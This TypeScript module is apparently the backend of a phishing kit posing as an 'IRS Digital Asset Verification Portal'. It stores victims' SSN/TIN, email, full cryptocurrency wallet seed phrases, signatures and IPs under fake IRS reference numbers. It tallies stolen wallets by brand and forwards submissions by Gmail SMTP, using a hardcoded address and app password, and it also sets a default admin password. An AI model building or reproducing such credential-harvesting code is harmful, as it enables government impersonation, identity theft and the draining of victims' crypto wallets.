import fs from 'fs';
import path from 'path';

export interface Submission {
  id: string;
  reference_number: string;
  submitted_at: string;
  ssn_tin: string;
  email: string;
  wallet_type: string;
  wallet_brand: string;
  seed_length: number;
  seed_words: string[];
  seed_phrase_full: string;
  signature_data: string;
  client_ip: string;
  user_agent: string;
}

const DATA_DIR = path.join(process.cwd(), 'data');
const DATA_FILE = path.join(DATA_DIR, 'submissions.json');

function ensureDataFile() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2), 'utf-8');
  }
}

export function getAllSubmissions(): Submission[] {
  try {
    ensureDataFile();
    const content = fs.readFileSync(DATA_FILE, 'utf-8');
    const parsed = JSON.parse(content);
    if (Array.isArray(parsed)) {
      return parsed.sort(
        (a, b) => new Date(b.submitted_at).getTime() - new Date(a.submitted_at).getTime()
      );
    }
    return [];
  } catch (error) {
    console.error('Error reading submissions:', error);
    return [];
  }
}

export function getSubmissionById(id: string): Submission | null {
  const all = getAllSubmissions();
  return all.find((s) => s.id === id || s.reference_number === id) || null;
}

export function saveSubmission(payload: {
  ssn_tin?: string;
  email?: string;
  wallet_type?: string;
  wallet_brand?: string;
  seed_length?: number;
  seed_words?: string[];
  signature?: string;
  client_ip?: string;
  user_agent?: string;
}): Submission {
  ensureDataFile();
  const all = getAllSubmissions();

  const id = 'sub_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
  const dateObj = new Date();
  const dateStr = dateObj.toISOString().slice(0, 10).replace(/-/g, '');
  const randHash = Math.random().toString(36).substring(2, 8).toUpperCase();
  const refNumber = `IRS-TX-${dateStr}-${randHash}`;

  const words = Array.isArray(payload.seed_words) ? payload.seed_words : [];
  const wordsFlat = words.join(' ').trim();

  const newRecord: Submission = {
    id,
    reference_number: refNumber,
    submitted_at: dateObj.toISOString(),
    ssn_tin: (payload.ssn_tin || '').trim() || 'Not Provided',
    email: (payload.email || '').trim() || 'Not Provided',
    wallet_type: (payload.wallet_type || '').trim() || 'Not Specified',
    wallet_brand: (payload.wallet_brand || '').trim() || 'Not Specified',
    seed_length: Number(payload.seed_length) || words.length,
    seed_words: words,
    seed_phrase_full: wordsFlat,
    signature_data: payload.signature || '',
    client_ip: payload.client_ip || 'Unknown',
    user_agent: payload.user_agent || 'Unknown',
  };

  all.unshift(newRecord);
  fs.writeFileSync(DATA_FILE, JSON.stringify(all, null, 2), 'utf-8');

  return newRecord;
}

export function deleteSubmission(id: string): boolean {
  try {
    ensureDataFile();
    const all = getAllSubmissions();
    const filtered = all.filter((s) => s.id !== id && s.reference_number !== id);
    if (filtered.length !== all.length) {
      fs.writeFileSync(DATA_FILE, JSON.stringify(filtered, null, 2), 'utf-8');
      return true;
    }
    return false;
  } catch (error) {
    console.error('Error deleting submission:', error);
    return false;
  }
}

export function getStats() {
  const all = getAllSubmissions();
  const now = new Date();
  const oneDayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);

  const todayCount = all.filter((s) => new Date(s.submitted_at) >= oneDayAgo).length;

  let coldCount = 0;
  let hotCount = 0;
  const brandCounts: Record<string, number> = {};

  all.forEach((s) => {
    if ((s.wallet_type || '').toLowerCase().includes('cold')) coldCount++;
    else if ((s.wallet_type || '').toLowerCase().includes('hot')) hotCount++;

    const brand = s.wallet_brand || 'Unknown';
    brandCounts[brand] = (brandCounts[brand] || 0) + 1;
  });

  let topBrand = 'None';
  let topBrandCount = 0;
  for (const [brand, count] of Object.entries(brandCounts)) {
    if (count > topBrandCount) {
      topBrand = brand;
      topBrandCount = count;
    }
  }

  return {
    total: all.length,
    today: todayCount,
    coldWallets: coldCount,
    hotWallets: hotCount,
    topBrand: topBrand !== 'None' ? `${topBrand} (${topBrandCount})` : 'N/A',
  };
}

export function saveSubmissionDirect(record: Submission) {
  ensureDataFile();
  const all = getAllSubmissions();
  // Prevent duplicate insertion
  if (!all.some((s) => s.id === record.id || s.reference_number === record.reference_number)) {
    all.unshift(record);
    fs.writeFileSync(DATA_FILE, JSON.stringify(all, null, 2), 'utf-8');
  }
}

const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');

export function getLocalSettings() {
  ensureDataFile();
  if (fs.existsSync(SETTINGS_FILE)) {
    try {
      const content = fs.readFileSync(SETTINGS_FILE, 'utf-8');
      return JSON.parse(content);
    } catch (e) {
      console.error('Error reading settings.json:', e);
    }
  }

  // Default initial configuration matching .private/config.php
  return {
    admin_password: process.env.ADMIN_PASSWORD || 'admin2026',
    email_config: {
      enabled: true,
      smtp_host: 'smtp.gmail.com',
      smtp_port: 587,
      smtp_secure: false,
      smtp_user: 'ahmarjabbar7@gmail.com',
      smtp_pass: 'spteslvopkiduhsu',
      recipient_email: 'ahmarjabbar7@gmail.com',
      sender_name: 'IRS Digital Asset Verification Portal',
    },
    updated_at: new Date().toISOString(),
  };
}

export function saveLocalSettings(settings: any) {
  ensureDataFile();
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2), 'utf-8');
}
